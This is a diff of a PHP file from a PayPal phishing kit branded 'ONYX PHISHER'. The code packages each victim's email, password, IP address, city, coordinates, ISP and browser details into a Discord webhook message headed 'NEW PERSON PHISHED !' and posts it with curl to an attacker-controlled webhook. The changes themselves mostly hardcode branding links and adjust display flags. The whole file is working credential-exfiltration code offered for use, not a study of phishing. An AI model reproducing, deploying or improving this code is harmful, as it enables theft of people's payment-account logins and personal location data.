@@ -163,89 +163,89 @@
     $url = file_get_contents("Panel/discord_webhook.txt");
     $timestamp = date("c", strtotime("now"));
     $json_data = json_encode([
-    "username" => $name[1],
-    "avatar_url" => $logo[1],
+    "username" => "ONYX PHISHER/PayPal",
+    "avatar_url" => "https://cdn.discordapp.com/attachments/633782210238873612/873275767696523304/kisspng-black-circle-logo-clip-art-5b0d39c31fb5b7.4826877915275934111299.png",
     "tts" => false,
     "embeds" => [
         [
             "title" => "NEW PERSON PHISHED !",
             "type" => "rich",
             "description" => 'A new person has been trapped on your fake login page PayPal. His IP was therefore added to the blacklist. The next time they visit your site, they will be automatically redirected to the link specified in the "`redirection.txt`" file.',
-            "url" => $github_back[1],
+            "url" => "https://github.com/Esio-01",
             "timestamp" => $timestamp,
             "color" => hexdec( "#0000" ),
             "footer" => [
-                "text" => $github_front[1],
-                "icon_url" => $logo[1]
+                "text" => "https://github.com/Esio-01",
+                "icon_url" => "https://cdn.discordapp.com/attachments/633782210238873612/873275767696523304/kisspng-black-circle-logo-clip-art-5b0d39c31fb5b7.4826877915275934111299.png",
             ],
             "thumbnail" => [
-                "url" => "https://images-ext-1.discordapp.net/external/NdTLyBOqhKA-z7MyQdt94zyHx3wBEVMaxkEXVFlZveI/https/cdn.mee6.xyz/guild-images/826239328933642290/a038ce70045ee597828be371e14f4b1c1b9da959b75d793baae90cf695e072b7.gif?width=630&height=630"
+                "url" => "https://cdn.mee6.xyz/guild-images/826239328933642290/a038ce70045ee597828be371e14f4b1c1b9da959b75d793baae90cf695e072b7.gif"
             ],
             "author" => [
-                "name" => $dev_by_esio[1],
-                "url" => $discord[1]
+                "name" => "Dev By Esio#4871",
+                "url" => "https://cdn.discordapp.com/attachments/633782210238873612/873275767696523304/kisspng-black-circle-logo-clip-art-5b0d39c31fb5b7.4826877915275934111299.png"
             ],
             "fields" => [
                 [
-                    "name" => "IP:",
+                    "name" => "IP address:",
                     "value" => "`". $embed_ip. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Email:",
                     "value" => "`". $embed_email. "`",
 		    "url" => "discord.com",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Password:",
                     "value" => "`". $embed_password. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "City",
                     "value" => "`". $embed_city. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Region:",
                     "value" => "`". $embed_region. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Country:",
                     "value" => "`". $embed_country. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Postal code",
                     "value" => "`". $embed_postal. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Latitude:",
                     "value" => "`". $embed_latitude. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Longitude:",
                     "value" => "`". $embed_longitude. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Fuseau horaire:",
                     "value" => "`". $embed_timezone. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Languages:",
                     "value" => "`". $embed_languages. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Europe:",
                     "value" => "`". $embed_europe. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "ASN",
@@ -255,12 +255,12 @@
                 [
                     "name" => "ISP:",
                     "value" => "`". $embed_isp. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "Browser:",
                     "value" => "`". $embed_browser. "`",
-                    "inline" => true
+                    "inline" => false
                 ],
                 [
                     "name" => "User agent:",
@@ -280,3 +280,4 @@ curl_setopt( $ch, CURLOPT_HEADER, 0);
 curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 $response = curl_exec( $ch );
 curl_close( $ch );
+
